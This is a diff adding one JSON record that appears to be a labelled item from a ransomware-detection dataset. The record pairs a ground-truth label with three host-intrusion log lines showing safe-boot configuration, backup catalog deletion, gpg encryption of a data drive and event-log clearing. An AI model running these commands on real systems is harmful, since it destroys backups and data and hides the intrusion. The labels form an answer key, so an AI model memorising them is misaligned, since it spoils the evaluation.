@@ -1,0 +1,41 @@
+{
+ "unit": 1096,
+ "gt": {
+  "gt_class": "family_variant",
+  "gt_case": "CASE-005",
+  "confidence": "medium",
+  "needs_review": true,
+  "reason": "勒索家族变体：阶段组合与 CASE-005 不完全一致"
+ },
+ "technique": "配置安全模式启动后删除备份编录并加密数据分区",
+ "sources": [
+  "hids",
+  "hids",
+  "hids"
+ ],
+ "logs": [
+  {
+   "timestamp": "2026-07-30 04:48:50",
+   "source": "hids",
+   "log_id": "HID0656313",
+   "content": "bcdedit /set {default} safeboot network cmd.exe cmd.exe /c bcdedit /set {default} safeboot <== cmd.exe /c bcde",
+   "event_id": "1096-HID0656313"
+  },
+  {
+   "timestamp": "2026-07-30 04:56:50",
+   "source": "hids",
+   "log_id": "HID0656354",
+   "content": "wbadmin delete catalog -quiet && wbadmin delete systemstatebackup -deleteOldest <== cmd.exe /c wbadmin <== ser",
+   "event_id": "1096-HID0656354"
+  },
+  {
+   "timestamp": "2026-07-30 04:58:20",
+   "source": "hids",
+   "log_id": "HID0656362",
+   "content": "gpg -c --batch --passphrase-file D:\\k.dat --yes D:\\Data\\* && wevtutil cl Application cmd.exe cmd.exe /c cipher",
+   "event_id": "1096-HID0656362"
+  }
+ ],
+ "retrieval_full": [],
+ "evidence_for_agent": null
+}
